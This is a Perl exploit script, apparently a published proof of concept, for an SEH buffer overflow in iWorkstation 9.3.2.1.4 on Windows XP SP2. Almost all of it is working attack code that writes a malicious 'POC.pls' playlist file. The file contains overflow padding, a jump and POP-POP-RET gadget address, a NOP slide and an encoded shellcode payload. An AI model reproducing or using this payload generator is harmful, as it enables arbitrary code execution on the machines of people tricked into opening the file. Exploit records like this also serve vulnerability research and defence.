#iworkstation Version 9.3.2.1.4 seh exploit
#Author Sanjeev Gupta san.gupta86[at]gmail.com
#Download Vulnerable application from http://www.e-soft.co.uk/iWorkstation93214Setup.exe
#Vulnerable version iworkstation Version 9.3.2.1.4
#Tested on XP SP2
#Greets Puneet Jain


my $head = "\x5B\x70\x6C\x61\x79\x6C\x69\x73\x74\x5D\x0D\x0A\x46\x69\x6C\x65\x31\x3D";
my $buff = "\x41" x 260;
my $buff1= "\xeb\x06\x90\x90";
my $buff2 = pack('V',0x73421DEF);                          #73421DEF   5E               POP ESI

my $slide = "\x90" x 12;
my $code =
"\xDB\xDF\xD9\x74\x24\xF4\x58\x2B\xC9\xB1\x33\xBA".
"\x4C\xA8\x75\x76\x83\xC0\x04\x31\x50\x13\x03\x1C\xBB\x97\x83\x60".
"\x53\xDE\x6C\x98\xA4\x81\xE5\x7D\x95\x93\x92\xF6\x84\x23\xD0\x5A".
"\x25\xCF\xB4\x4E\xBE\xBD\x10\x61\x77\x0B\x47\x4C\x88\xBD\x47\x02".
"\x4A\xDF\x3B\x58\x9F\x3F\x05\x93\xD2\x3E\x42\xC9\x1D\x12\x1B\x86".
"\x8C\x83\x28\xDA\x0C\xA5\xFE\x51\x2C\xDD\x7B\xA5\xD9\x57\x85\xF5".
"\x72\xE3\xCD\xED\xF9\xAB\xED\x0C\x2D\xA8\xD2\x47\x5A\x1B\xA0\x56".
"\x8A\x55\x49\x69\xF2\x3A\x74\x46\xFF\x43\xB0\x60\xE0\x31\xCA\x93".
"\x9D\x41\x09\xEE\x79\xC7\x8C\x48\x09\x7F\x75\x69\xDE\xE6\xFE\x65".
"\xAB\x6D\x58\x69\x2A\xA1\xD2\x95\xA7\x44\x35\x1C\xF3\x62\x91\x45".
"\xA7\x0B\x80\x23\x06\x33\xD2\x8B\xF7\x91\x98\x39\xE3\xA0\xC2\x57".
"\xF2\x21\x79\x1E\xF4\x39\x82\x30\x9D\x08\x09\xDF\xDA\x94\xD8\xA4".
"\x05\x77\xC9\xD0\xAD\x2E\x98\x59\xB0\xD0\x76\x9D\xCD\x52\x73\x5D".
"\x2A\x4A\xF6\x58\x76\xCC\xEA\x10\xE7\xB9\x0C\x87\x08\xE8\x6E\x46".
"\x9B\x70\x5F\xED\x1B\x12\x9F";



my $buff4 = "\x90" x 20000;
my $file = "POC.pls";

open ($File,">$file");
print  $File $head.$buff.$buff1.$buff2.$slide.$code.$buff4;
close($File)